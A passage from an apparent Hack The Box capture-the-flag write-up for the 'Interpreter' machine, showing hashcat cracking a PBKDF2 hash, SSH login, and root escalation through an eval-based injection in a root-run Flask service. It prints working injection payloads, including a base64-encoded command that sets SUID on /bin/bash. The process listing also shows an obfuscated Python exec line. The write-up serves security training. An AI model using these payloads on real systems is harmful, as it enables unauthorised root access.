* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

sha256:600000:REDACTED:REDACTED:REDACTED
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:REDACTED:REDACTED
Time.Started.....: Sat May 30 18:02:03 2026 (2 mins, 55 secs)
Time.Estimated...: Sat May 30 18:04:58 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       57 H/s (11.39ms) @ Accel:128 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: REDACTED/14344385 (0.07%)
Rejected.........: 0/REDACTED (0.00%)
Restore.Point....: REDACTED/14344385 (0.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599040-599999
Candidate.Engine.: Device Generator
Candidates.#1....: REDACTED -> REDACTED
Hardware.Mon.#1..: Util: 96%

Started: Sat May 30 18:01:33 2026
Stopped: Sat May 30 18:04:59 2026
```

After a while, it did eventually crack! Luckily, it didn't take too long (about 3.5 minutes).

We can now SSH into sedric.

```shell
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $ssh sedric@interpreter.htb
The authenticity of host 'interpreter.htb (10.129.244.184)' can't be established.
ED25519 key fingerprint is SHA256:Oz7Fk6YvrB8/5uSyuoY+mqLefkwpPaepkXAppxIX0xk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'interpreter.htb' (ED25519) to the list of known hosts.
sedric@interpreter.htb's password: 
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat May 30 05:10:09 2026 from REDACTED
sedric@interpreter:~$ ls
user.txt
sedric@interpreter:~$ cat user.txt
REDACTED
```

## Root Flag

### Internal Port

We can try a couple commands to see if we get anything interesting.

```shell
sedric@interpreter:~$ sudo -l
-bash: sudo: command not found
```

It seems like sudo is not installed here.

```shell
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 102092 12044 ?        Ss   02:46   0:00 /sbin/init
root           2  0.0  0.0      0     0 ?        S    02:46   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   02:46   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   02:46   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   02:46   0:00 [slub_flushwq]
root           6  0.0  0.0      0     0 ?        I<   02:46   0:00 [netns]
root           8  0.0  0.0      0     0 ?        I<   02:46   0:00 [kworker/0:0H-events_highpri]
root          10  0.0  0.0      0     0 ?        I<   02:46   0:00 [mm_percpu_wq]
root          11  0.0  0.0      0     0 ?        I    02:46   0:00 [rcu_tasks_kthread]
root          12  0.0  0.0      0     0 ?        I    02:46   0:00 [rcu_tasks_rude_kthread]
root          13  0.0  0.0      0     0 ?        I    02:46   0:00 [rcu_tasks_trace_kthread]
root          14  0.0  0.0      0     0 ?        S    02:46   0:00 [ksoftirqd/0]
root          15  0.0  0.0      0     0 ?        I    02:46   0:00 [rcu_preempt]
root          16  0.0  0.0      0     0 ?        S    02:46   0:00 [migration/0]
root          17  0.0  0.0      0     0 ?        I    02:46   0:00 [kworker/0:1-cgroup_free]
root          18  0.0  0.0      0     0 ?        S    02:46   0:00 [cpuhp/0]
root          19  0.0  0.0      0     0 ?        S    02:46   0:00 [cpuhp/1]
root          20  0.0  0.0      0     0 ?        S    02:46   0:00 [migration/1]
root          21  0.0  0.0      0     0 ?        S    02:46   0:00 [ksoftirqd/1]
root          23  0.0  0.0      0     0 ?        I<   02:46   0:00 [kworker/1:0H-events_highpri]
root          26  0.0  0.0      0     0 ?        S    02:46   0:00 [kdevtmpfs]
root          27  0.0  0.0      0     0 ?        I<   02:46   0:00 [inet_frag_wq]
root          28  0.0  0.0      0     0 ?        S    02:46   0:00 [kauditd]
root          29  0.0  0.0      0     0 ?        S    02:46   0:00 [khungtaskd]
root          30  0.0  0.0      0     0 ?        S    02:46   0:00 [oom_reaper]
root          32  0.0  0.0      0     0 ?        I<   02:46   0:00 [writeback]
root          33  0.0  0.0      0     0 ?        S    02:46   0:00 [kcompactd0]
root          34  0.0  0.0      0     0 ?        SN   02:46   0:00 [ksmd]
root          35  0.0  0.0      0     0 ?        SN   02:46   0:00 [khugepaged]
root          36  0.0  0.0      0     0 ?        I<   02:46   0:00 [kintegrityd]
root          37  0.0  0.0      0     0 ?        I<   02:46   0:00 [kblockd]
root          38  0.0  0.0      0     0 ?        I<   02:46   0:00 [blkcg_punt_bio]
root          39  0.0  0.0      0     0 ?        I<   02:46   0:00 [tpm_dev_wq]
root          40  0.0  0.0      0     0 ?        I<   02:46   0:00 [edac-poller]
root          41  0.0  0.0      0     0 ?        I<   02:46   0:00 [devfreq_wq]
root          42  0.0  0.0      0     0 ?        I<   02:46   0:00 [kworker/0:1H-kblockd]
root          43  0.0  0.0      0     0 ?        S    02:46   0:00 [kswapd0]
root          50  0.0  0.0      0     0 ?        I<   02:46   0:00 [kthrotld]
root          52  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/24-pciehp]
root          53  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/25-pciehp]
root          54  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/26-pciehp]
root          55  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/27-pciehp]
root          56  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/28-pciehp]
root          57  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/29-pciehp]
root          58  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/30-pciehp]
root          59  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/31-pciehp]
root          60  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/32-pciehp]
root          61  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/33-pciehp]
root          62  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/34-pciehp]
root          63  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/35-pciehp]
root          64  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/36-pciehp]
root          65  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/37-pciehp]
root          66  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/38-pciehp]
root          67  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/39-pciehp]
root          68  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/40-pciehp]
root          69  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/41-pciehp]
root          70  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/42-pciehp]
root          71  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/43-pciehp]
root          72  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/44-pciehp]
root          73  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/45-pciehp]
root          74  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/46-pciehp]
root          75  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/47-pciehp]
root          76  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/48-pciehp]
root          77  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/49-pciehp]
root          78  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/50-pciehp]
root          79  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/51-pciehp]
root          80  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/52-pciehp]
root          81  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/53-pciehp]
root          82  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/54-pciehp]
root          83  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/55-pciehp]
root          84  0.0  0.0      0     0 ?        I<   02:46   0:00 [acpi_thermal_pm]
root          86  0.0  0.0      0     0 ?        I<   02:46   0:00 [mld]
root          87  0.0  0.0      0     0 ?        I<   02:46   0:00 [ipv6_addrconf]
root          92  0.0  0.0      0     0 ?        I<   02:46   0:00 [kstrp]
root          97  0.0  0.0      0     0 ?        I<   02:46   0:00 [zswap-shrink]
root          98  0.0  0.0      0     0 ?        I<   02:46   0:00 [kworker/u5:0]
root         142  0.0  0.0      0     0 ?        I<   02:46   0:00 [kworker/1:1H-kblockd]
root        1101  0.0  0.0      0     0 ?        I<   02:46   0:00 [ata_sff]
root        1105  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_0]
root        1113  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_0]
root        1123  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_1]
root        1128  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_2]
root        1129  0.0  0.0      0     0 ?        I<   02:46   0:00 [vmw_pvscsi_wq_0]
root        1133  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_2]
root        1136  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_1]
root        1139  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_3]
root        1141  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_3]
root        1145  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_4]
root        1154  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_4]
root        1156  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_5]
root        1157  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_5]
root        1167  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_6]
root        1168  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_6]
root        1170  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_7]
root        1172  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_7]
root        1174  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_8]
root        1176  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_8]
root        1177  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_9]
root        1178  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_9]
root        1179  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_10]
root        1180  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_10]
root        1181  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_11]
root        1185  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_11]
root        1186  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_12]
root        1188  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_12]
root        1189  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_13]
root        1190  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_13]
root        1191  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_14]
root        1192  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_14]
root        1194  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_15]
root        1195  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_15]
root        1196  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_16]
root        1200  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_16]
root        1201  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_17]
root        1202  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_17]
root        1203  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_18]
root        1206  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_18]
root        1208  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_19]
root        1209  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_19]
root        1210  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_20]
root        1211  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_20]
root        1213  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_21]
root        1215  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_21]
root        1216  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_22]
root        1218  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_22]
root        1219  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_23]
root        1220  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_23]
root        1222  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_24]
root        1224  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_24]
root        1225  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_25]
root        1227  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_25]
root        1229  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_26]
root        1230  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_26]
root        1231  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_27]
root        1233  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_27]
root        1235  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_28]
root        1236  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_28]
root        1237  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_29]
root        1239  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_29]
root        1241  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_30]
root        1242  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_30]
root        1243  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_31]
root        1244  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_31]
root        1246  0.0  0.0      0     0 ?        S    02:46   0:00 [scsi_eh_32]
root        1248  0.0  0.0      0     0 ?        I<   02:46   0:00 [scsi_tmf_32]
root        1276  0.0  0.0      0     0 ?        I    02:46   0:00 [kworker/u4:28-flush-8:0]
root        1356  0.0  0.0      0     0 ?        I    02:46   0:05 [kworker/0:3-events]
root        1530  0.0  0.0      0     0 ?        S    02:46   0:00 [jbd2/sda1-8]
root        1531  0.0  0.0      0     0 ?        I<   02:46   0:00 [ext4-rsv-conver]
root        1572  0.0  0.7  58124 28748 ?        Rs   02:46   0:02 /lib/systemd/systemd-journald
root        1595  0.0  0.1  28028  7448 ?        Ss   02:46   0:00 /lib/systemd/systemd-udevd
root        2043  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/61-vmw_vmci]
root        2060  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/62-vmw_vmci]
root        2168  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/63-vmw_vmci]
root        2170  0.0  0.0      0     0 ?        S    02:46   0:00 [irq/16-vmwgfx]
systemd+    2339  0.0  0.1  90104  6664 ?        Ssl  02:46   0:00 /lib/systemd/systemd-timesyncd
root        2449  0.0  0.1  92460  7684 ?        R<sl 02:46   0:00 /sbin/auditd
_laurel     2467  0.0  0.1   9448  5876 ?        R<   02:46   0:01 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root        2848  0.0  0.0      0     0 ?        I<   02:46   0:00 [cryptd]
root        2861  0.0  0.0      0     0 ?        S    02:46   0:00 [audit_prune_tree]
root        3137  0.0  0.0   6616  2624 ?        Ss   02:46   0:00 /usr/sbin/cron -f
message+    3138  0.0  0.1   9244  5068 ?        Ss   02:46   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidf
root        3146  0.0  0.1 221800  4716 ?        Ssl  02:46   0:00 /usr/sbin/rsyslogd -n -iNONE
root        3147  0.0  0.1  17028  7804 ?        Ss   02:46   0:00 /lib/systemd/systemd-logind
root        3156  0.0  0.1  16552  5928 ?        Ss   02:46   0:00 /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
root        3249  0.0  0.0   5876  3548 ?        Ss   02:46   0:00 dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhc
root        3325  0.0  0.0      0     0 ?        I    02:46   0:00 [kworker/1:4-events]
root        3398  0.1  0.2 144712 11352 ?        Sl   02:46   0:09 /usr/sbin/vmtoolsd
root        3450  0.0  0.2  40776 11416 ?        S    02:46   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root        3550  0.0  0.6 400212 25876 ?        Ssl  02:46   0:03 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
mirth       3553  0.8 11.2 2920572 452140 ?      Ssl  02:46   1:14 /usr/lib/jvm/java-17-openjdk-amd64/bin/java -server -Xmx256m -Djav
root        3555  0.0  0.7  39872 31040 ?        Ss   02:46   0:01 /usr/bin/python3 /usr/local/bin/notif.py
root        3567  0.0  0.0   5880  1036 tty1     Ss+  02:46   0:00 /sbin/agetty -o -p -- \u --noclear - linux
root        3579  0.0  0.2  15452  9328 ?        Ss   02:46   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
mysql       3679  0.0  3.5 1415460 143484 ?      Ssl  02:46   0:01 /usr/sbin/mariadbd
root        3997  0.0  0.0      0     0 ?        I    03:01   0:00 [kworker/1:0-events]
root        4324  0.0  0.0      0     0 ?        I    04:36   0:00 [kworker/u4:2-ext4-rsv-conversion]
mirth       4356  0.0  0.0   3220  2904 ?        S    04:44   0:00 ./UTkunZiYqzRI
mirth       4357  0.0  0.0   2584   928 ?        S    04:45   0:00 /bin/sh
mirth       4360  0.0  0.0   3932  2980 ?        S    04:46   0:00 /usr/bin/bash
mirth       4399  0.0  0.2  19088 11136 ?        S    04:46   0:00 /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompre
mirth       4400  0.0  0.0   7552  3676 pts/0    Ss   04:46   0:00 /usr/bin/bash -i
root        4412  0.0  0.0      0     0 ?        I    04:48   0:00 [kworker/u4:1-events_unbound]
mirth       4415  0.0  0.2  21676 10524 pts/0    S+   04:51   0:00 mysql -h localhost -u mirthdb -p
root        4475  0.0  0.2  17752 11068 ?        Ss   05:10   0:00 sshd: sedric [priv]
sedric      4478  0.0  0.2  18904 10360 ?        Ss   05:10   0:00 /lib/systemd/systemd --user
sedric      4479  0.0  0.0 103152  3036 ?        S    05:10   0:00 (sd-pam)
root        4480  0.0  0.0      0     0 ?        I    05:10   0:00 [kworker/0:0-rcu_gp]
sedric      4490  0.0  0.1  18012  6896 ?        S    05:10   0:00 sshd: sedric@pts/1
sedric      4491  0.0  0.1   7980  4788 pts/1    Ss   05:10   0:00 -bash
sedric      4505  0.0  0.1  11092  4408 pts/1    R+   05:11   0:00 ps aux
```

When looking closely, we can see an intersting file being ran: `/usr/local/bin/notif.py`.

```shell
sedric@interpreter:~$ ls -lah /usr/local/bin/notif.py
-rwxr----- 1 root sedric 2.3K Sep 19  2025 /usr/local/bin/notif.py
```

We do not have write or execute permissions, but we can read the file.

{% raw %}
```py
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```
{% endraw %}

We can see that the service is running on the internal port 54321.

### Code Injection

You can also see a vulnerability.

{% raw %}
```py
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old..."
return eval(f"f'''{template}'''")
```
{% endraw %}

This is an SSTI/eval injection vulnerability. The code takes in user input, embeds it into an f-string, and uses eval(). We can inject code (aka commands), which the system will run.

Allowed Characters: `^[a-zA-Z0-9._'\"(){}=+/]+$`

You can see that some important characters are not allowed, like space. However, let us first test if this vulnerabilty actually exists using the following command:

```shell
wget -q -O- http://127.0.0.1:54321/addPatient \
  --post-data='<?xml version="1.0"?><patient><firstname>{__import__("os").popen("id").read()}</firstname><lastname>test</lastname><sender_app>test</sender_app><timestamp>test</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>' \
  --header="Content-Type: application/xml"
```

This command would theoretically run `id` as root.

```shell
sedric@interpreter:~$ wget -q -O- http://127.0.0.1:54321/addPatient \
  --post-data='<?xml version="1.0"?><patient><firstname>{__import__("os").popen("id").read()}</firstname><lastname>test</lastname><sender_app>test</sender_app><timestamp>test</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>' \
  --header="Content-Type: application/xml"
Patient uid=0(root) gid=0(root) groups=0(root)
 test (M), 36 years old, received from test at test
```

And, as we can see, it does run as root and command injection is allowed. To become root, it is a bit trickier, as some characters (like space) are not allowed. However, we can use base64 encoding and decoding to execute commands.

```shell
__import__("os").popen(__import__("base64").b64decode("Y2htb2QgK3MgL2Jpbi9iYXNoCg==").decode()).read()
```

This code will allow us to run the base64 decoded command of the base64 string given.

`Y2htb2QgK3MgL2Jpbi9iYXNoCg==` decodes to `chmod +s /bin/bash`, adding a suid binary to `/bin/bash`.

The full command becomes:

```shell
wget -q -O- http://127.0.0.1:54321/addPatient \
  --post-data='<?xml version="1.0"?><patient><firstname>{__import__("os").popen(__import__("base64").b64decode("Y2htb2QgK3MgL2Jpbi9iYXNoCg==").decode()).read()}</firstname><lastname>test</lastname><sender_app>test</sender_app><timestamp>test</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>' \
  --header="Content-Type: application/xml"
```

```shell
sedric@interpreter:~$ wget -q -O- http://127.0.0.1:54321/addPatient \
  --post-data='<?xml version="1.0"?><patient><firstname>{__import__("os").popen(__import__("base64").b64decode("Y2htb2QgK3MgL2Jpbi9iYXNoCg==").decode()).read()}</firstname><lastname>test</lastname><sender_app>test</sender_app><timestamp>test</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>' \
  --header="Content-Type: application/xml"
Patient  test (M), 36 years old, received from test at test
sedric@interpreter:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.3M Sep  6  2025 /bin/bash
```

Success! `/bin/bash` does have a suid binary now! We can become root!

```shell
sedric@interpreter:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
REDACTED
```

# We got all flags!!!!!!!